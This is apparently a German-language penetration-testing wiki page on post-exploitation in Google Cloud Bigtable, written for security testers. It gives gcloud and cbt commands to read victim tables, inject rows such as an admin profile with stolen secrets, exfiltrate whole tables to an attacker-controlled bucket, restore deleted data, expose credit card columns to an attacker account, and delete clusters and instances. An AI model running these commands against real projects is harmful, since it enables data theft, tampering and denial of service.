# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Für weitere Informationen zu Bigtable siehe:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Installieren Sie die `cbt`-CLI einmal über das Cloud SDK, damit die untenstehenden Befehle lokal funktionieren:
>
> ```bash
> gcloud components install cbt
> ```

### Zeilen lesen

**Berechtigungen:** `bigtable.tables.readRows`

`cbt` wird mit dem Cloud SDK ausgeliefert und spricht direkt mit den Admin-/Data-APIs, ohne Middleware zu benötigen. Richten Sie es auf das kompromittierte Projekt/Instanz und lesen Sie Zeilen direkt aus der Tabelle aus. Begrenzen Sie den Scan, wenn Sie nur einen kurzen Blick benötigen.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### Zeilen schreiben

**Berechtigungen:** `bigtable.tables.mutateRows` (Sie benötigen `bigtable.tables.readRows`, um die Änderung zu bestätigen).

Verwenden Sie dasselbe Tool, um beliebige Zellen zu upserten. Das ist der schnellste Weg, um configs zu backdooren, web shells zu droppen oder poisoned dataset rows zu platzieren.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` akzeptiert rohe Bytes über die `@/path`-Syntax, sodass du kompilierte payloads oder serialisierte protobufs genau so hochladen kannst, wie downstream services es erwarten.

### Zeilen in deinen Bucket exportieren

**Berechtigungen:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Es ist möglich, die Inhalte einer gesamten Tabelle in einen vom attacker kontrollierten Bucket zu exfiltrate, indem du einen Dataflow-Job startest, der Zeilen in einen von dir kontrollierten GCS-Bucket streamt.

> [!NOTE]
> Beachte, dass du die Berechtigung `iam.serviceAccounts.actAs` für ein SA benötigst, das genügend Rechte hat, um den Export durchzuführen (standardmäßig, falls nicht anders angegeben, wird das default compute SA verwendet).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Wechseln Sie die Vorlage zu `Cloud_Bigtable_to_GCS_Parquet` oder `Cloud_Bigtable_to_GCS_SequenceFile`, wenn Sie Parquet/SequenceFile-Ausgaben statt JSON wünschen. Die Berechtigungen sind dieselben; nur der Vorlagenpfad ändert sich.

### Zeilen importieren

**Berechtigungen:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Es ist möglich, den Inhalt einer gesamten Tabelle aus einem vom Angreifer kontrollierten Bucket zu importieren, indem ein Dataflow-Job gestartet wird, der Zeilen in einen von Ihnen kontrollierten GCS-Bucket streamt. Dafür muss der Angreifer zunächst eine Parquet-Datei mit den zu importierenden Daten im erwarteten Schema erstellen. Ein Angreifer könnte die Daten zunächst im Parquet-Format exportieren, wie in der vorherigen Technik beschrieben, mit der Einstellung `Cloud_Bigtable_to_GCS_Parquet` und dann neue Einträge in die heruntergeladene Parquet-Datei hinzufügen.



> [!NOTE]
> Beachten Sie, dass Sie die Berechtigung `iam.serviceAccounts.actAs` für ein SA benötigen, das über ausreichende Rechte verfügt, um den Export durchzuführen (standardmäßig, sofern nicht anders angegeben, wird das default compute SA verwendet).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### Backups wiederherstellen

**Berechtigungen:** `bigtable.backups.restore`, `bigtable.tables.create`.

Ein Angreifer mit diesen Berechtigungen kann ein Backup in eine neue Tabelle unter eigener Kontrolle wiederherstellen, um alte sensible Daten wiederherzustellen.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### Tabellen wiederherstellen (Undelete tables)

**Berechtigungen:** `bigtable.tables.undelete`

Bigtable unterstützt Soft-Deletion mit einer Schonfrist (typischerweise standardmäßig 7 Tage). Während dieses Zeitraums kann ein Angreifer mit der Berechtigung `bigtable.tables.undelete` eine kürzlich gelöschte Tabelle wiederherstellen und alle ihre Daten zurückgewinnen, wodurch er möglicherweise auf sensible Informationen zugreifen kann, die als vernichtet galten.

Dies ist besonders nützlich für:
- Wiederherstellen von Daten aus Tabellen, die von Verteidigern während des Incident Response gelöscht wurden
- Zugriff auf historische Daten, die absichtlich gelöscht wurden
- Rückgängigmachen von versehentlichen oder böswilligen Löschungen, um Persistence aufrechtzuerhalten
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> Die Undelete-Operation funktioniert nur innerhalb des konfigurierten Aufbewahrungszeitraums (Standard: 7 Tage). Nachdem dieses Zeitfenster abgelaufen ist, werden die Tabelle und ihre Daten dauerhaft gelöscht und können über diese Methode nicht wiederhergestellt werden.


### Autorisierte Views erstellen

**Permissions:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Autorisierte Views ermöglichen es, einen kuratierten Teil der Tabelle darzustellen. Anstatt Least Privilege zu beachten, verwenden Sie sie, um **genau die sensiblen Spalten-/Zeilenmengen** zu veröffentlichen, die Ihnen wichtig sind, und setzen Sie Ihr eigenes Principal auf die Whitelist.

> [!WARNING]
> Die Sache ist: Um eine autorisierte View zu erstellen, müssen Sie außerdem Zeilen in der Basistabelle lesen und mutieren können. Sie erhalten dadurch also keine zusätzlichen Berechtigungen — diese Technik ist daher größtenteils nutzlos.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
Da der Zugriff auf die View beschränkt ist, übersehen Verteidiger oft, dass Sie gerade einen neuen hochsensitiven Endpunkt erstellt haben.

### Authorized Views lesen

**Berechtigungen:** `bigtable.authorizedViews.readRows`

Wenn Sie Zugriff auf eine Authorized View haben, können Sie Daten daraus mithilfe der Bigtable-Clientbibliotheken lesen, indem Sie den Namen der Authorized View in Ihren Leseanfragen angeben. Beachten Sie, dass die Authorized View wahrscheinlich einschränkt, worauf Sie in der Tabelle zugreifen können. Im Folgenden ein Beispiel mit Python:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service durch Löschoperationen

**Berechtigungen:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Jede der Bigtable-Löschberechtigungen kann für denial of service-Angriffe missbraucht werden. Ein Angreifer mit diesen Berechtigungen kann den Betrieb stören, indem er kritische Bigtable-Ressourcen löscht:

- **`bigtable.appProfiles.delete`**: Löscht Anwendungsprofile und unterbricht dadurch Client-Verbindungen sowie Routing-Konfigurationen
- **`bigtable.authorizedViews.delete`**: Entfernt autorisierte Views und kappt legitime Zugriffswege für Anwendungen
- **`bigtable.authorizedViews.deleteTagBinding`**: Entfernt Tag-Bindings von autorisierten Views
- **`bigtable.backups.delete`**: Zerstört Backup-Snapshots und eliminiert damit Disaster-Recovery-Optionen
- **`bigtable.clusters.delete`**: Löscht komplette Cluster und verursacht sofortige Datenunverfügbarkeit
- **`bigtable.instances.delete`**: Entfernt komplette Bigtable-Instanzen und löscht alle Tabellen und Konfigurationen
- **`bigtable.tables.delete`**: Löscht einzelne Tabellen und verursacht Datenverlust sowie Ausfälle von Anwendungen
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> Löschvorgänge sind häufig sofort und unwiderruflich. Stellen Sie sicher, dass vor dem Testen dieser Befehle Backups vorhanden sind, da sie zu dauerhaftem Datenverlust und schweren Dienstunterbrechungen führen können.

{{#include ../../../banners/hacktricks-training.md}}
